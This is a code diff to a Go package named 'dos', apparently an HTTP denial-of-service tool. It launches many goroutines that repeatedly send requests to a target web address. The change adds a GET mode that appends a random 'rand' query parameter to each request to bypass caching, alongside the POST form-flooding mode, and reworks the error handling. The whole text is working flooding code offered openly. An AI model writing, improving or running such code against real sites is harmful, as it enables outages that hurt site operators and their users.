@@ -5,7 +5,9 @@ package dos
 import (
 	"context"
 	"crypto/tls"
+	"fmt"
 	"log"
+	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
@@ -19,6 +21,7 @@ import (
 
 // TargetInf - struct for webaddress and formnames
 type TargetInf struct {
+	mode              string
 	threads           int
 	duration          int
 	webaddress        string
@@ -100,14 +103,15 @@ func (inf *TargetInf) Copy() TargetInf {
 }
 
 // New - Initialize new DoS
-// d = duration, t = threads, urladdr = webaddress
-func New(d int, t int, urladdr string) *TargetInf {
+// m = mode, dur = duration, thr = threads, addr = webaddress
+func New(m string, d int, t int, addr string) *TargetInf {
 	return &TargetInf{
+		mode:       m,
 		formnames:  url.Values{},
 		headers:    make(map[string]string),
 		threads:    t,
 		duration:   d,
-		webaddress: urladdr,
+		webaddress: addr,
 	}
 }
 
@@ -131,23 +135,19 @@ func makeRequest(done chan<- struct{}, info *TargetInf) {
 	r := runtime.NumGoroutine()
 	resp, err := hc.Do(req)
 	if err != nil {
-		//log.Printf("ERROR: do post request: %s\n", err)	// FOR DEBUG
-		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | %s\n", r, info.webaddress)
-	}
-
-	// Catch some errors e.g. "socket: too many open files" or "socket: connection reset by peer"
-	if resp != nil {
+		//log.Printf("ERROR: do post request: %s\n", err) // FOR DEBUG
+		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | %s\n", r, req.URL)
+		close(result) // Close request result channel
+		close(done)   // sending empty data to done channel
+	} else { // Catch some Error e.g. "socket: too many open files" or "socket: connection reset by peer"
 		defer resp.Body.Close() // Close response body at end of function
 
 		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
-			log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | %s\n", r, info.webaddress)
+			log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | %s\n", r, req.URL)
 		} else {
-			log.Printf("\tRoutine: %6d |   Argh! Online but Broken [%3d] | %s\n", r, resp.StatusCode, info.webaddress)
+			log.Printf("\tRoutine: %6d |   Argh! Online but Broken [%3d] | %s\n", r, resp.StatusCode, req.URL)
 		}
 
-		close(result) // Close request result channel
-		close(done)   // sending empty data to done channel
-	} else {
 		close(result) // Close request result channel
 		close(done)   // sending empty data to done channel
 	}
@@ -165,7 +165,7 @@ func runner(ctx context.Context, start <-chan struct{}, info *TargetInf) {
 			done := make(chan struct{})
 			go makeRequest(done, info)
 			select {
-			case <-done:
+			case <-done: // Continue when the reset finish faster than 1sec (This will mostly not happen)
 				continue
 			case <-time.After(1 * time.Second): // make sure that every second start a new request, still when the last not finish yet
 				continue
@@ -183,7 +183,7 @@ func start(ctx context.Context, info *TargetInf, done chan<- struct{}) {
 		go runner(ctx, start, info)
 	}
 
-	// Build initial request
+	// Build initial request (It's irrelevant if GET or POST cause we don't send this initial request to target)
 	func() {
 		log.Println("INFO: Building Initial Request")
 		result := make(chan *http.Request) // create channel result
@@ -196,31 +196,55 @@ func start(ctx context.Context, info *TargetInf, done chan<- struct{}) {
 	close(done)  // synchronise and unlock sync in parent function
 }
 
-// buildRequest - building request and copy forms and headers in a peristent state
+// buildRequest - building POST request and copy forms and headers in a peristent state
 func buildRequest(result chan<- *http.Request, info *TargetInf) {
-	// Building initial request and add values to request
-	req, err := http.NewRequest("POST", info.webaddress, strings.NewReader(info.formnames.Encode()))
-	if err != nil {
-		log.Println("ERROR: building request")
+	// Return function
+	returnReq := func(req *http.Request) {
+		// add headers and authorization (if set) to request and make it persistent
+		if info.persistentHeaders == nil {
+			for key, value := range info.headers {
+				req.Header.Set(key, value)
+			}
+			if info.authSet {
+				req.SetBasicAuth(info.authUser, info.authPass)
+				tempVal := req.Header.Values("Authorization")[0]
+				req.Header.Set("Authorization", tempVal)
+			}
+			info.persistentHeaders = req.Header.Clone()
+		} else {
+			req.Header = info.persistentHeaders
+		}
+		result <- req
 	}
 
-	req.PostForm = info.formnames // add url.Values too request
+	// Building Request GET or POST mode available
+	if info.mode == "GET" {
+		// Build random parameter
+		r := rand.New(rand.NewSource(time.Now().UnixNano())) // Generate Random int
+		rndp := fmt.Sprintf("?rand=%d", r.Uint64())
 
-	// add headers and authorization (if set) to request and make it persistent
-	if info.persistentHeaders == nil {
-		for key, value := range info.headers {
-			req.Header.Set(key, value)
+		// Building initial request and add values to request
+		req, err := http.NewRequest("GET", info.webaddress+rndp, strings.NewReader(info.formnames.Encode()))
+		if err != nil {
+			log.Println("ERROR: building request")
 		}
-		if info.authSet {
-			req.SetBasicAuth(info.authUser, info.authPass)
-			tempVal := req.Header.Values("Authorization")[0]
-			req.Header.Set("Authorization", tempVal)
+
+		req.Form = info.formnames // add url.Values too request
+
+		returnReq(req)
+	} else if info.mode == "POST" {
+		// Building initial request and add values to request
+		req, err := http.NewRequest("POST", info.webaddress, strings.NewReader(info.formnames.Encode()))
+		if err != nil {
+			log.Println("ERROR: building request")
 		}
-		info.persistentHeaders = req.Header.Clone()
+
+		req.PostForm = info.formnames // add url.Values too request
+
+		returnReq(req)
 	} else {
-		req.Header = info.persistentHeaders
+		log.Fatalln("ERROR: buildingRequest() unrecognized MODE")
 	}
-	result <- req
 }
 
 // validateThreads - warns if more threads starting as cpu cores available
